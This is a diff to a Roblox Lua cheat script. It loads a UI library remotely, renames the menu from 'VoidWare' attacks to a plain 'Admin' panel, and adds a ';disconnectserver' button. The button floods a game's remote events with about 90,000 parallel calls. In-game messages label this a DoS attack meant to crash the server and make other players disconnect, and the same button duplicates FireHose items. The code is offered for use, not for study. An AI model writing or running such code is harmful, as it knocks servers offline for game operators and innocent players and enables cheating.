@@ -3,15 +3,15 @@ local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/rel
 
 -- 2. Cria a Janela Principal (Padrão VoidWare)
 local Window = WindUI:CreateWindow({
-    Title = "VoidWare Custom",
-    SubTitle = "Ataques & Utilitários",
-    Icon = "rbxassetid://10723345791",
+    Title = "Admin",
+    SubTitle = "Administração & Utilitários",
+    Icon = "terminal",
     Size = UDim2.fromOffset(550, 380),
     Theme = "Dark"
 })
 
 local MainTab = Window:Tab({
-    Title = "Combate",
+    Title = "Commandos",
     Icon = "lucide-swords"
 })
 
@@ -463,5 +463,86 @@ MainTab:Button({
         else
             WindUI:Notify({Title = "⚠️ Aviso", Content = "Por favor, selecione um alvo primeiro no Dropdown!", Duration = 4})
         end
+    end
+})
+
+MainTab:Button({
+    Title = ";disconnectserver",
+    Desc = "Inicia um tráfego de rede imenso, Pode desligar o servidor e (Erro: 277)
+    Callback = function()
+        local player = game:GetService("Players").LocalPlayer
+        if not player then return end
+        local replicatedStorage = game:GetService("ReplicatedStorage")
+
+        local character = player.Character or player.CharacterAdded:Wait()
+        local rootpart = character:WaitForChild("HumanoidRootPart", 10)
+        if not rootpart then 
+            WindUI:Notify({ Title = "Erro", Content = "HumanoidRootPart não encontrado.", Duration = 5 })
+            return 
+        end
+        local oldcf = rootpart.CFrame
+
+        local re = replicatedStorage:FindFirstChild("RE")
+        local toolRemote = re and re:FindFirstChild("1Too1l")
+
+        if not toolRemote then 
+            WindUI:Notify({ Title = "Erro", Content = "Remote funcional não encontrado.", Duration = 5 })
+            return 
+        end
+
+        WindUI:Notify({ Title = "Ataque DoS Iniciado", Content = "Derrubando o servidor, aguarde os jogadores crasharem...", Duration = 5 })
+
+        task.spawn(function()
+            for m = 1, 90000 do
+                task.spawn(function()
+                    if toolRemote:IsA("RemoteFunction") then
+                        toolRemote:InvokeServer("PickingTools", "FireHose")
+                    else
+                        toolRemote:FireServer("PickingTools", "FireHose")
+                    end
+                end)
+
+                local backpack = player:FindFirstChild("Backpack")
+                if backpack then
+                    local fireHose = backpack:FindFirstChild("FireHose")
+                    if fireHose and fireHose:FindFirstChild("ToolSound") then
+                        fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
+                    end
+                end
+                if m % 15 == 0 then task.wait() end
+            end
+        end)
+
+        task.wait(0.4)
+        player.CharacterRemoving:Wait()
+        local newCharacter = player.CharacterAdded:Wait()
+        local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
+        local humanoid = newCharacter:WaitForChild("Humanoid", 15)
+
+        if newRootPart and humanoid then
+            task.wait(0.7)
+            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+            newRootPart.CFrame = oldcf
+            newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+        end
+
+        WindUI:Notify({ Title = "Script de Dupe", Content = "Concluído! Equipando itens gerados...", Duration = 5 })
+        task.wait(0.5)
+
+        local backpack = player:WaitForChild("Backpack", 10)
+        if backpack then
+            local items = backpack:GetChildren()
+            local equipCount = 0
+            for i = 1, #items do
+                local item = items[i]
+                if item:IsA("Tool") and item.Name == "FireHose" then
+                    equipCount = equipCount + 1
+                    task.defer(function() item.Parent = newCharacter end)
+                    if equipCount % 8 == 0 then task.wait(0.02) end 
+                end
+            end
+        end
+        task.wait(0.5)
+        WindUI:Notify({ Title = "Script de Dupe", Content = "Processo finalizado com sucesso.", Duration = 5 })
     end
 })
